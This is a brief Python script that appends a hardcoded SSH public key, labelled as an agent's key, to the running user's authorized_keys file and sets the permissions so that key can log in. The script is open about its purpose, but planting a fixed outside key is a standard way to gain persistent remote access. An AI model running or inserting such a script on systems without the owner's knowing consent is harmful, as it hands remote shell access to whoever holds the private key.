import os
import sys
from pathlib import Path

# The agent's public key (ED25519)
AGENT_PUB_KEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDsnYERxBRVUpQg2xhozu7g+wues9tXfo+f6RpfwL/+T op@op"


def setup_ssh_access():
    """Adds the agent's public key to authorized_keys."""

    # Get user's home directory and .ssh path
    home_dir = Path.home()
    ssh_dir = home_dir / ".ssh"
    auth_keys_file = ssh_dir / "authorized_keys"

    print(f"🔧 Setting up SSH access for agent on {home_dir}...")

    # 1. Ensure .ssh directory exists with correct permissions
    if not ssh_dir.exists():
        print(f"  Creating {ssh_dir}...")
        ssh_dir.mkdir(parents=True, mode=0o700)
    else:
        print(f"  {ssh_dir} exists. Ensuring permissions are 700...")
        ssh_dir.chmod(0o700)

    # 2. Read existing keys to verify duplicates
    existing_keys = ""
    if auth_keys_file.exists():
        try:
            existing_keys = auth_keys_file.read_text()
        except Exception as e:
            print(f"❌ Error reading {auth_keys_file}: {e}")
            return

    # 3. Append key if not present
    if AGENT_PUB_KEY in existing_keys:
        print("✅ Agent key is already authorized!")
    else:
        print("  Adding agent key to authorized_keys...")
        try:
            with open(auth_keys_file, "a") as f:
                if existing_keys and not existing_keys.endswith("\n"):
                    f.write("\n")
                f.write(f"{AGENT_PUB_KEY} # Added by setup_access.py\n")
            print("✅ Key added successfully.")
        except Exception as e:
            print(f"❌ Error writing to {auth_keys_file}: {e}")
            return

    # 4. Ensure authorized_keys permissions are 600
    try:
        auth_keys_file.chmod(0o600)
        print("  Permissions set to 600 for authorized_keys.")
    except Exception as e:
        print(f"⚠️ Warning: Could not chmod {auth_keys_file}: {e}")

    print("\n🎉 Access setup complete! The agent should now be able to connect.")


if __name__ == "__main__":
    setup_ssh_access()
